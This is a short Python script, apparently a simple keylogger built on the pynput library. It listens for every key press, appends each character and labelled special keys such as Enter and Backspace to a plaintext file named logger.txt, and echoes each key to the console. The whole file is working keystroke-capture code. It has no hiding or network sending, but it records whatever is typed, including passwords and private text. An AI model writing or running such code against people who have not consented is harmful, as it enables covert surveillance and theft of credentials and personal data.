from pynput import keyboard

def key_pressed(key):
    try:
        char = key.char
        with open("logger.txt", 'a') as f:
            f.write(char)
        print(f'Key {char} pressed')
    except AttributeError:
        special_keys = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.esc: '[ESC]'
        }
        key_str = special_keys.get(key, f'[{key}]')
        with open("logger.txt", 'a') as f:
            f.write(key_str)
        print(f'Special key {key_str} pressed')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()